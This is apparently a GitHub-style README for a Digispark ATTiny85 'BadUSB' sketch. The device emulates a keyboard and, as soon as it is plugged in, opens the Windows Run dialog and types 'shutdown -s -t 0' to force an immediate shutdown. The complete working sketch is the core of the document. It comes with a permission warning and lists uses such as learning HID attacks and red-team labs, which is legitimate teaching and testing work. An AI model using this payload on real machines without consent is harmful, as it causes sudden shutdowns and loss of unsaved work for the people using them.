# Digispark Instant Shutdown (ATTiny85)

This Digispark (ATTiny85) script emulates a USB keyboard to instantly shut down a Windows machine by executing a shutdown command via the Run dialog.


# What This Script Does

## When the Digispark is plugged into a Windows system:

* Waits for the USB device to be recognized.

* Opens Run (Win + R).

* Types the command: shutdown -s -t 0

* Presses Enter.

* The system shuts down immediately.

After execution, the device enters an infinite loop and does nothing further.


# How It Works

* Uses the DigiKeyboard library.

* Acts as a HID keyboard.

* Requires no drivers on Windows.

* Executes faster than a human can react.


# Codes
```bash
#include "DigiKeyboard.h"

void setup() {
  // empty
}

void loop() {
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(600);
  DigiKeyboard.print("shutdown -s -t 0");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(5000);

  for(;;) { /* stop execution */ }
}
```


# Requirements

* Digispark ATTiny85.

* Arduino IDE.

* Digispark board support installed.

* DigiKeyboard library.

* Windows OS (tested).


# Warning

* This script will immediately shut down the target system.

* Unsaved work will be lost.

* Do NOT use on systems without permission.


# Use Cases

* Learning HID attacks.

* USB automation experiments.

* Red team / blue team lab testing.

* Demonstrating physical security risks.

* Educational cybersecurity demos.


# License

MIT License

Copyright (c) 2026 John Valinsky

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files, to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.